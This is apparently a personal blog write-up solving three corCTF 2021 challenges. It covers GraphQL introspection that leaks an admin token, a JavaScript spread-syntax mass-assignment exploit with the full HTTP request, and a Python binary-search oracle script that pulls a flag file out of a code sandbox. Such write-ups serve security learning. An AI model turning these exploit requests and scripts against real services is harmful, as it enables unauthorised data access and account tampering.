---
title: "CTF - corCTF 2021"
categories: [ctf]
date: 2021-09-02
comments: true
image: /images/kashmir.png
description: CTF - corCTF 2021
favicon: /images/favicon.ico
---

# corCTF 2021

<p align="center">
  <img src="/images/writeups/corCTF2021/logo.png" width="30%"/>
</p>

Welcome! I've participated on my own in this CTF for team [ISwearIGoogledIt](https://ctftime.org/team/109689) and got some challenges! I focused on the web ones, but had two from crypto and one from misc. I enjoyed the web ones, learned a lot from graphql and javascript and its spread syntax.

<p align="center">
  <img src="/images/writeups/corCTF2021/rank.png" width="70%"/>
</p>

---

Challenge index:

### Web
- [devme](#devme)
- [buyme](#buyme)

### Misc
- [yeetcode](#yeetcode)

<small><i><a href="https://github.com/kashmir54/md-toc">Table of contents generated with md-toc</a></i></small>


---

# Web

## devme

an ex-google, ex-facebook tech lead recommended me this book!

https://devme.be.ax


First thing was to check the functionality of the website and I fond this interesting. With the email sent, the JS makes a call to a graphql endpoint which takes a JSON as an input with the name/email:

<p align="center">
  <img src="/images/writeups/corCTF2021/Web/1_formjs.png" width="70%"/>
</p>

```javascript
document.getElementById('form').onsubmit = async e => {
  e.preventDefault();

  const email = document.getElementById('email').value;

  let res = await (await fetch('/graphql', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify({
    query,
    variables: { email }
  })
  })).json();

  if (res.data) {
  document.getElementById('form-wrapper').innerHTML = `<h2 class="form-heading 
      text-center">Thanks, you'll hear from us soon!</h2>`
  }

  return false;
}
```

For the first run I debugged the JS and res variable was:

username: "bb0b9d32cdba541ee0bf7ea8acc5b166e09c429a5493f15a2cae714b15f84d33"

Other run obtained

username: "e17fb2b1415f1a670810aa54e23042818fdd93d4e873f7e2c07c421ea598acc7"


Seems like the Graphql is executing the query set on the parameter?

<p align="center">
  <img src="/images/writeups/corCTF2021/Web/1_token.png" width="90%"/>
</p>

I prepared the following payload in BurpSuite and sent it to the server:

- Query:

```
query "mutation createUser($email: String!) {\n\tcreateUser(email: $email) {\n\t\tusername\n\t}\n}\n"
variables {…}
email "test@test.com"
```

<p align="center">
  <img src="/images/writeups/corCTF2021/Web/1_graphql.png" width="90%"/>
</p>

Yes it does. I have never used Graphql so I had to get a grasp of it with the [documentation](https://graphql.org/learn/queries/) to understand what's going on and how it works.
Current query send every time is this one:

```json
{
  "query" : "mutation createUser($email: String!){\n\tcreateUser(email: $email) {\n\t\tusername\n\t}\n}\n",
  "variables" : {"email" : "test@test.com"}
}
```

To enumarate the objects in the API we can use the following query. [HackTricks always helps](https://book.hacktricks.xyz/pentesting/pentesting-web/graphql) and I also saw it on this [great write up](https://jaimelightfoot.com/blog/hack-in-paris-2019-ctf-meet-your-doctor-graphql-challenge/):

- Query:

```json
{
  "query":"{__schema{\n\t queryType{\n\t fields{\n\t name\n}\n}\n}\n}",
  "variables":{"email":"test@test.com"}
}
```

<p align="center">
  <img src="/images/writeups/corCTF2021/Web/1_graphql.png" width="90%"/>
</p>

We can see the object flag. Let's work on crafting a payload to retrieve its content.
To get more information:

- Query:

```json
{
  "query":"{__schema {types {name}}}",
  "variables":{"email":"test@test.com"}
}
```

Response

<p align="center">
  <img src="/images/writeups/corCTF2021/Web/1_2_graphql.png" width="90%"/>
</p>

Let's retrieve the users by the username (since we saw that the response to create user was a user hash):

- Query:

```json
{
  "query":"{users {username}}",
  "variables":{"email":"test@test.com"}
}
```

Response:

<p align="center">
  <img src="/images/writeups/corCTF2021/Web/1_3_graphql.png" width="90%"/>
</p>


Okey, now I know something more about Graphql. Following the same syntax, I will try to obtain the content from flag:

- Query:

```json
{"query":"{flag}"}
```

Response Error:

```json
{
  "message":"Field \"flag\" argument \"token\" of type \"String!\" is required, but it was not provided."
}
```

From the message we suppose that there is a token that will be used to obtain the flag... What if the user _admin_ had two attributes _username_ and _token_? Let's give it a try:

- Query:

```json
{"query":"{users {username token}}"}
```

Response:

```json
{"data":{
  "users":[
  {
    "username":"admin",
    "token":"3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b"
  },
  {
    "username":"b82d9af8a6226c072bcd811e7a009ffb36b2ad88be67ac396d170fe8e2f1de7c",
    "token":"5568f87dc1ca15c578e6b825ffca7f685ac433c1826b075b499f68ea309e79a6"
  },
  {"...":"..."}
```

Now let's try to retrieve the flag using the admin token:

- Query:

```json
{
  "query":"{flag(token:\"3cd3a50e63b3cb0a69cfb7d9d4f0ebc1dc1b94143475535930fa3db6e687280b\")}"
}
```

Response:

```json
{"data":{"flag":"corctf{ex_g00g13_3x_fac3b00k_t3ch_l3ad_as_a_s3rvice}"}}
```

We have the flag:

<p align="center">
  <img src="/images/writeups/corCTF2021/Web/1_7_burpflag.png" width="90%"/>
</p>


``` corctf{ex_g00g13_3x_fac3b00k_t3ch_l3ad_as_a_s3rvice} ```


Great, I could learn how GraphQL works and wanted to go further. Now that I have understood how it works and how to enumerate manually. I found a tool from [swisskyrepo](https://github.com/swisskyrepo) similar to sqlmap, it's called [GraphQLmap](https://github.com/swisskyrepo/GraphQLmap).
I saw how it works and makes the recon task so much easier:

```
python3 graphqlmap.py -u https://devme.be.ax/graphql -v --method POST 
```

<p align="center">
  <img src="/images/writeups/corCTF2021/Web/1_4_graphqlmap.png" width="90%"/>
</p>

Not only enumerate, but also interact with the API:

<p align="center">
  <img src="/images/writeups/corCTF2021/Web/1_5_graphqlmap.png" width="90%"/>
</p>

<p align="center">
  <img src="/images/writeups/corCTF2021/Web/1_6_flag.png" width="90%"/>
</p>


``` corctf{ex_g00g13_3x_fac3b00k_t3ch_l3ad_as_a_s3rvice} ```


## buyme
I made a new site to buy flags! But no hoarding, okay :<

I enjoyed this one so much! So let's dive in:

We land into a website where we can register, log in and buy flags. By default, we have 100$ and buy four flags, but not the one we want, the CTF flag.

<div display="grid">
  <img src="/images/writeups/corCTF2021/Web/2_01.png" width="48%"/>
  <img src="/images/writeups/corCTF2021/Web/2_02.png" width="48%"/>
</div>

They provided us the code, so I took a look into it. Most interesting parts were:

- The access to the flag storage and the buying process:

```javascript
const fs = require("fs");

const flags = new Map();
for(let flag of JSON.parse(fs.readFileSync("flags.json")).flags) {
  if(flag.name === "corCTF") {
    flag.text = process.env.FLAG || "corctf{test_flag}";
  }
  flags.set(flag.name, flag);
}

const users = new Map();

const buyFlag = ({ flag, user }) => {

  if(!flags.has(flag)) {
    throw new Error("Unknown flag");
  }
  if(user.money < flags.get(flag).price) {
    throw new Error("Not enough money");
  }

  user.money -= flags.get(flag).price;
  user.flags.push(flag);
  users.set(user.user, user);
};

module.exports = { flags, users, buyFlag };
```

- The api.js where the content is served:

```javascript
const express = require("express");
const bcrypt = require("bcrypt");

const router = express.Router();

const db = require("../db.js");

const requiresLogin = (req, res, next) => {
  if(!req.user) {
    return res.redirect("/?error=" + encodeURIComponent("You must be logged in"));
  }
  next();
};

router.post("/register", async (req, res) => {
  let { user, pass } = req.body;
  if(!user || !pass) {
    return res.redirect("/?error=" + encodeURIComponent("Missing username or password"));
  }
  if(db.users.has(user)) {
    return res.redirect("/?error=" + encodeURIComponent("A user already exists with that username"));
  }
  db.users.set(user, {
    user,
    flags: [],
    money: 100,
    pass: await bcrypt.hash(pass, 12)
  });
  res.cookie('user', user, { signed: true, maxAge: 1000*60*60*24 });
  res.redirect("/");
});

router.post("/login", async (req, res) => {
  let { user, pass } = req.body;
  if(!user || !pass) {
    return res.redirect("/?error=" + encodeURIComponent("Missing username or password"));
  }
  if(!db.users.has(user)) {
    return res.redirect("/?error=" + encodeURIComponent("No user exists with that username"));
  }
  if(!await bcrypt.compare(pass, db.users.get(user).pass)) {
    return res.redirect("/?error=" + encodeURIComponent("Incorrect password"));
  }

  res.cookie('user', user, { signed: true, maxAge: 1000*60*60*24 });
  res.redirect("/");
});

//Special attention here:
router.post("/buy", requiresLogin, async (req, res) => {
  if(!req.body.flag) {
    return res.redirect("/flags?error=" + encodeURIComponent("Missing flag to buy"));
  }
  try {
    db.buyFlag({ user: req.user, ...req.body });
  }
  catch(err) {
    return res.redirect("/flags?error=" + encodeURIComponent(err.message));
  }

  res.redirect("/?message=" + encodeURIComponent("Flag bought successfully"));
});

module.exports = router;
```

At the first glimpse I thought, maybe I can register with infinite money and buy the flag, but after some crazy ideas I found no way to exploit the user creation, no JSON inyection was possible in this piece of code:

```javascript
db.users.set(user, {
  user,
  flags: [],
  money: 100,
  pass: await bcrypt.hash(pass, 12)
});
```

Then I just focused on the buying process. And found this piece of code interesting, specially in the arguments and the [spread syntax (...)](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Operators/Spread_syntax) with a user input after it (**req.body**):

```javascript
router.post("/buy", requiresLogin, async (req, res) => {
  if(!req.body.flag) {
    return res.redirect("/flags?error=" + encodeURIComponent("Missing flag to buy"));
  }
  try {
    //Buying a flag with spread argument controlled by a user
    db.buyFlag({ user: req.user, ...req.body });
  }
  catch(err) {
    return res.redirect("/flags?error=" + encodeURIComponent(err.message));
  }

  res.redirect("/?message=" + encodeURIComponent("Flag bought successfully"));
});
```

Let's check the request when we buy the Indian flag:

<p align="center">
  <img src="/images/writeups/corCTF2021/Web/2_03.png" width="90%"/>
</p>

We can see that a POST request is sent with variable user equals to the user obtained in the session and the _flag=India_ set in the resquest body. Then, the buyFlag function is called.

```javascript
const buyFlag = ({ flag, user }) => {

  if(!flags.has(flag)) {
    throw new Error("Unknown flag");
  }
  if(user.money < flags.get(flag).price) {
    throw new Error("Not enough money");
  }

  user.money -= flags.get(flag).price;
  user.flags.push(flag);
  users.set(user.user, user);
};
```

I started thinking... Maybe I can spoof the user object at the call **{ user: req.user, ...req.body }** by adding in the body request a key called **user**, then this **user** will be the last at the function called and will substitute the one provided at the beginning. 

The key for this challenge is how we send that information. I'm currently learning and it took me some thinking for this. I used Burp Suite Repeater for this attack and to test different options or ideas. In this process I used the provided code to deploy the web server and to debug the payload type and how the payload was injected in the spread syntax.

First I tried the following payload, but no effect took placed because req.body won't parse the user and place it as it is:

```
POST /api/buy HTTP/1.1
Host: buyme.be.ax
Content-Type: application/x-www-form-urlencoded
Cookie: user=s%3Akash.hWxlfYBnVsfOT6FEyD7nAloOEFSk7kX4%2BHCCYdnKBVk

flag=corCTF&user={}

or 

flag=corCTF&user={"kash":{"flags":[],"money":10000000000000000000000000000,
  "pass":"$2a$12$e6.1cSQ4ynSUXDTN5HvkN.RlAqWDOtOqHL3twe/wRD77MBKKELJZO"
}}
```

Then while debugging I found the key, sending an object. How? Instead of sending parameters and strings, let's send a JSON object. To do it, I changed the header Content-Type from _x-www-form-urlencoded_ to _application/json_ and spoof of money variable and set it to **1e400** for example:


```
POST /api/buy HTTP/1.1
Host: buyme.be.ax
Content-Type: application/json
Cookie: user=s%3Akash.hWxlfYBnVsfOT6FEyD7nAloOEFSk7kX4%2BHCCYdnKBVk

{"flag":"corCTF",
  "user":{
    "user": "kash",
    "flags": [],
    "money": 1e400,
    "pass":"$2b$12$e4fanJaZOX1pwZTVxsHcZOIuGp.3Ti27FtVnesFrURw4eSWfY6aGi"
  }
}
```

We can see that the request is responding flag bought successfully.
<p align="center">
  <img src="/images/writeups/corCTF2021/Web/2_0.png" width="90%"/>
</p>

We can go to my flag inventory and saw the flag (it shows two because I sent the request twice):

<p align="center">
  <img src="/images/writeups/corCTF2021/Web/2_1_flag.png" width="90%"/>
</p>

``` corctf{h0w_did_u_steal_my_flags_you_flag_h0arder??!!} ```

Really fun and learned a lot.

---

# Misc

## yeetcode
Brush up on your coding skills and ace your next interview with YeetCode! Flag is at ./flag.txt
https://yeetcode.be.ax

We enter in the website and find that there is a challenge for coding:

<p align="center">
  <img src="/images/writeups/corCTF2021/Web/1_6_flag.png" width="90%"/>
</p>

With the following input (python code that meets the requirements), it shows that there are 10 test cases:

```python
def f(a, b):
  return a+b
```

- Message: You passed 10/10 test cases. Congrats!


On the provided code, we can see that there are two fixes test cases, the rest is random:

- Test 1: 2+3 = 5
- Test 2: 5+7 = 12

The provided code:

```python
from flask import Flask, render_template, request, session
import random, epicbox, os

# docker pull 

epicbox.configure(
  profiles=[
    epicbox.Profile('python', 'python:3.9.6-alpine')
  ]
)

app = Flask(__name__)
app.secret_key = os.urandom(16)
flag = open('flag.txt').read()

@app.route('/')
def yeet():
  return render_template('yeet.html')

@app.route('/yeet')
def yeetyeet():
  return render_template('yeetyeet.html')

@app.route('/yeetyeet', methods=['POST'])
def yeetyeetyeet():
  if 'run' in session and session['run']:
    return {'error': True, 'msg': 'You already have code running, please wait for it to finish.'}
  session['run'] = True
  code = request.data
  tests = [(2, 3, 5), (5, 7, 12)]
  for _ in range(8):
    a, b = random.randint(1, 100), random.randint(1, 100)
    tests.append((a, b, a + b))
  
  cmd = 'from code import f\n'
  outputs = []
  for case in tests:
    a, b, ans = case
    cmd += f'print(f({a}, {b}))\n'
    outputs.append(str(ans))

  files = [{'name': 'flag.txt', 'content': flag.encode()}, {'name': 'code.py', 'content': code}]
  limits = {'cputime': 1, 'memory': 16}
  result = epicbox.run('python', command='python3', stdin=cmd, files=files, limits=limits)

  if result['exit_code'] != 0:
    session['run'] = False
    return {'error': True, 'msg': 'Oops! Your code has an error in it. Please try again.'}
  actual = result['stdout'].decode().strip().split('\n')

  passes = 0
  fails = 0
  for i in range(len(outputs)):
    if outputs[i] == actual[i]:
      passes += 1
    else:
      fails += 1

  session['run'] = False
  return {'error': False, 'p': passes, 'f': fails}

if __name__ == "__main__":
  app.run(host='0.0.0.0', port=5000)
```

We cannot just place a print in the code and print the flag, because there is no output, but we can access and read the flag to make operations over it.
Since there are two fixed set cases, we can use them to bruteforce each char of the flag whenever or code gets in that specific test. Then, we have contron on triggering the error only in one of the test cases, for example:

Bruteforece first char:
if test case 2+3 and first char is a, return correct response (5), if it is not a, send failed response
if test case is not 2+3, return the correct sum (a+b)

In this way, if the recieve 10/10 tests passed, we know that the guessed letter is correct, otherwise it wasn't.
The following code is proposed:

```python

import requests

def guess_it(flag_index):

  a, b = 97, 126

  for guess in range(a,b):

    print("Guess ascii: {} - {}".format(guess, chr(guess)))

    r = requests.post(url=url, data = input_code.format(flag_index, guess), cookies = cookie)
    #print(r.json())
    # If read char if right:
    if r.json()['p'] == 1:

      print('Found: ' + chr(guess))
      return chr(guess)

  return 0


input_code = """def f(a, b):
  if a==2 and b==3:
    f = open("flag.txt", "rb")
    char = f.read()[{}]
    if char == {}:
      return 5
    else:
      return 1234
  else:
    return a"""


url = "https://yeetcode.be.ax/yeetyeet"
cookie = {"session": "eyJydW4iOmZhbHNlfQ.YSBRoA.tysIiP53vCiR6K95eHZA_1hxk30"}

flag = []

for flag_index in range(0,50):
  flag.append(guess_it(flag_index))
  print(''.join(flag))
```

It will take so long to get it by using linear search O(n)... Let's go for an easy binary search strategy (and also, use all posible ascii characters (from 32 to 126)):

```python
import requests

def guess_it(flag_index):

  a, b = 32, 126
  mid = (a+b)//2

  while a < b:

    print("Guess ascii: {} - {}".format(mid, chr(mid)))

    r = requests.post(url=url, data = input_code.format(flag_index, mid), cookies = cookie)
    #print(r.json())
    # If read char if right:
    if r.json()['p'] == 1:
      b = mid
    else:
      a = mid + 1
    mid = (a+b)//2

  
  return chr(mid-1)


input_code = """def f(a, b):
  if a==2 and b==3:
    f = open("flag.txt", "rb")
    char = f.read()[{}]
    if char < {}:
      return 5
    else:
      return 1234
  else:
    return a"""

url = "https://yeetcode.be.ax/yeetyeet"
cookie = {"session": "eyJydW4iOmZhbHNlfQ.YSBRoA.tysIiP53vCiR6K95eHZA_1hxk30"}

flag = []

for flag_index in range(0,50):
  flag.append(guess_it(flag_index))
  print(''.join(flag))

```

Output:

```
...
corctf{1m4g1n3_cp_g0lf_6a318df
Guess ascii: 79 - O
Guess ascii: 103 - g
Guess ascii: 91 - [
Guess ascii: 97 - a
Guess ascii: 100 - d
Guess ascii: 102 - f
Guess ascii: 101 - e
corctf{1m4g1n3_cp_g0lf_6a318dfe
Guess ascii: 79 - O
Guess ascii: 103 - g
Guess ascii: 115 - s
Guess ascii: 121 - y
Guess ascii: 124 - |
Guess ascii: 125 - }
corctf{1m4g1n3_cp_g0lf_6a318dfe}
Guess ascii: 79 - O
Guess ascii: 55 - 7
Guess ascii: 43 - +
Guess ascii: 37 - %
Guess ascii: 34 - "
Guess ascii: 33 - !
Guess ascii: 32 -  
corctf{1m4g1n3_cp_g0lf_6a318dfe}
Guess ascii: 79 - O
```

So much faster now ;)

``` corctf{1m4g1n3_cp_g0lf_6a318dfe} ```


That's all from this CTF, thanks for reading!